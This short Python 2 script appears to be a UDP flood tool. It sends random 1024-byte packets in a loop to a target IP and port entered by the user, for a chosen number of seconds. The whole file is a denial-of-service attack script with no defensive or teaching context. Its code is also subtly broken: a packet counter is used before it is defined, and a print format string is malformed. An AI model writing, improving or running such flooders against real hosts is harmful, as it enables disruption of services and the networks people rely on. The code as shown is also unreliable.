import socket
import random
import time

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #Open a new socket

bytes = random._urandom(1024) #Creates packet

ip = raw_input('Target IP: ')
port = input('Port: ')
duration = input('Number of seconds to send packets: ')
timeout = time.time() + duration

while True:
	if time.time() > timeout:
		break
	else:
		pass
	sock.sendto(bytes,(ip, port))
	sent = sent + 1
	print "Sent %s packet to %s throught port %s%"%(sent, ip, port)	